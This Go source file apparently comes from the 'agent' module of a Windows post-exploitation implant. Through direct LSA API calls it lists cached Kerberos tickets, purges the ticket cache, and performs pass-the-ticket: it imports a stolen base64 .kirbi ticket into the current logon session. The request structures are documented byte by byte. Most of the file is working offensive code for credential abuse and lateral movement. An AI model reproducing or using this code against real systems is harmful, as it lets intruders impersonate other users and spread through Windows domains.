//go:build windows

package agent

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	secur32               = windows.NewLazySystemDLL("secur32.dll")
	lsaConnectUntrusted   = secur32.NewProc("LsaConnectUntrusted")
	lsaLookupAuthPkg      = secur32.NewProc("LsaLookupAuthenticationPackage")
	lsaCallAuthPkg        = secur32.NewProc("LsaCallAuthenticationPackage")
	lsaFreeReturnBuffer   = secur32.NewProc("LsaFreeReturnBuffer")
)

// kerbLsaStr mirrors the Win32 LSA_STRING (ANSI, not Unicode).
// x64 layout: Length(2) + MaxLen(2) + pad(4) + Buffer ptr(8) = 16 bytes.
type kerbLsaStr struct {
	Length        uint16
	MaximumLength uint16
	_             [4]byte
	Buffer        uintptr
}

// kerbConnect opens an LSA connection and resolves the Kerberos authentication
// package ID. Both values are required by all three Kerberos operations.
func kerbConnect() (handle uintptr, pkgID uint32, err error) {
	r, _, _ := lsaConnectUntrusted.Call(uintptr(unsafe.Pointer(&handle)))
	if r != 0 {
		return 0, 0, fmt.Errorf("LsaConnectUntrusted NTSTATUS=0x%X", r)
	}
	name := []byte("Kerberos")
	ls := kerbLsaStr{
		Length:        uint16(len(name)),
		MaximumLength: uint16(len(name) + 1),
		Buffer:        uintptr(unsafe.Pointer(&name[0])),
	}
	r, _, _ = lsaLookupAuthPkg.Call(
		handle,
		uintptr(unsafe.Pointer(&ls)),
		uintptr(unsafe.Pointer(&pkgID)),
	)
	if r != 0 {
		return 0, 0, fmt.Errorf("LsaLookupAuthenticationPackage NTSTATUS=0x%X", r)
	}
	return handle, pkgID, nil
}

// kerberosListTickets lists cached Kerberos tickets for the current logon session.
// Delegates to klist.exe (present on all modern Windows systems) for output.
func kerberosListTickets() string {
	out, err := runShell("klist 2>&1")
	if err != nil {
		// klist failed or not present — try a quick LSA query for a ticket count.
		handle, pkgID, lsaErr := kerbConnect()
		if lsaErr != nil {
			return "[error: klist: " + err.Error() + "; LSA: " + lsaErr.Error() + "]"
		}
		// KerbQueryTicketCacheExMessage = 14
		// KERB_QUERY_TKT_CACHE_EX_REQUEST: MessageType(4) + LogonId(8) = 12 bytes
		var req [12]byte
		binary.LittleEndian.PutUint32(req[0:], 14)
		var respPtr uintptr
		var respLen, protStat uint32
		lsaCallAuthPkg.Call(
			handle, uintptr(pkgID),
			uintptr(unsafe.Pointer(&req[0])), uintptr(len(req)),
			uintptr(unsafe.Pointer(&respPtr)),
			uintptr(unsafe.Pointer(&respLen)),
			uintptr(unsafe.Pointer(&protStat)),
		)
		if respPtr != 0 {
			count := *(*uint32)(unsafe.Pointer(respPtr + 4))
			lsaFreeReturnBuffer.Call(respPtr)
			return fmt.Sprintf("Kerberos ticket cache: %d ticket(s) (klist unavailable: %v)", count, err)
		}
		return "[error: klist: " + err.Error() + "]"
	}
	return out
}

// kerberosPassTheTicket imports a base64-encoded .kirbi ticket via the LSA API.
//
// KERB_SUBMIT_TKT_REQUEST layout on x64 (KERB_CRYPTO_KEY32 variant, all 4-byte fields):
//
//	Offset  Size  Field
//	   0      4   MessageType  = 21 (KerbSubmitTicketMessage)
//	   4      4   LogonId.LowPart  (0 = current session)
//	   8      4   LogonId.HighPart (0 = current session)
//	  12      4   Flags            (0)
//	  16      4   Key32.KeyType    (0)
//	  20      4   Key32.Length     (0)
//	  24      4   Key32.Offset     (0)
//	  28      4   KerbCredSize     = len(ticket)
//	  32      4   KerbCredOffset   = 36 (== headerSize)
//	  36    ...   <raw .kirbi bytes>
func kerberosPassTheTicket(b64ticket string) string {
	ticketBytes, err := base64.StdEncoding.DecodeString(b64ticket)
	if err != nil {
		return "[error: base64 decode: " + err.Error() + "]"
	}
	if len(ticketBytes) == 0 {
		return "[error: empty ticket]"
	}

	handle, pkgID, err := kerbConnect()
	if err != nil {
		return "[error: " + err.Error() + "]"
	}

	const headerSize = 36
	reqBuf := make([]byte, headerSize+len(ticketBytes))
	binary.LittleEndian.PutUint32(reqBuf[0:], 21)                        // KerbSubmitTicketMessage
	binary.LittleEndian.PutUint32(reqBuf[28:], uint32(len(ticketBytes))) // KerbCredSize
	binary.LittleEndian.PutUint32(reqBuf[32:], headerSize)               // KerbCredOffset
	copy(reqBuf[headerSize:], ticketBytes)

	var respPtr uintptr
	var respLen, protStat uint32
	r, _, _ := lsaCallAuthPkg.Call(
		handle, uintptr(pkgID),
		uintptr(unsafe.Pointer(&reqBuf[0])), uintptr(len(reqBuf)),
		uintptr(unsafe.Pointer(&respPtr)),
		uintptr(unsafe.Pointer(&respLen)),
		uintptr(unsafe.Pointer(&protStat)),
	)
	if respPtr != 0 {
		lsaFreeReturnBuffer.Call(respPtr)
	}
	if r != 0 || protStat != 0 {
		return fmt.Sprintf("[error: PTT failed NTSTATUS=0x%X protocolStatus=0x%X]", r, protStat)
	}
	return "[+] ticket submitted successfully"
}

// kerberosPurge purges all Kerberos tickets for the current logon session.
//
// KERB_PURGE_TKT_CACHE_REQUEST layout on x64:
//
//	Offset  Size  Field
//	   0      4   MessageType  = 6 (KerbPurgeTicketCacheMessage)
//	   4      4   LogonId.LowPart  (0 = current session)
//	   8      4   LogonId.HighPart
//	  12      4   <padding for UNICODE_STRING 8-byte alignment>
//	  16      2   ServerName.Length     (0 = all servers)
//	  18      2   ServerName.MaxLen
//	  20      4   <padding for Buffer pointer>
//	  24      8   ServerName.Buffer     (nil)
//	  32      2   RealmName.Length      (0 = all realms)
//	  34      2   RealmName.MaxLen
//	  36      4   <padding>
//	  40      8   RealmName.Buffer      (nil)
//	  -- total 48 bytes --
func kerberosPurge() string {
	handle, pkgID, err := kerbConnect()
	if err != nil {
		return "[error: " + err.Error() + "]"
	}

	var req [48]byte
	binary.LittleEndian.PutUint32(req[0:], 6) // KerbPurgeTicketCacheMessage
	// LogonId = {0, 0} → current session (remaining bytes already zero)
	// ServerName and RealmName with zero lengths/buffers → purge all

	var respPtr uintptr
	var respLen, protStat uint32
	lsaCallAuthPkg.Call(
		handle, uintptr(pkgID),
		uintptr(unsafe.Pointer(&req[0])), uintptr(len(req)),
		uintptr(unsafe.Pointer(&respPtr)),
		uintptr(unsafe.Pointer(&respLen)),
		uintptr(unsafe.Pointer(&protStat)),
	)
	if respPtr != 0 {
		lsaFreeReturnBuffer.Call(respPtr)
	}
	if protStat != 0 {
		return fmt.Sprintf("[error: purge NTSTATUS=0x%X]", protStat)
	}
	return "[+] Kerberos ticket cache purged"
}
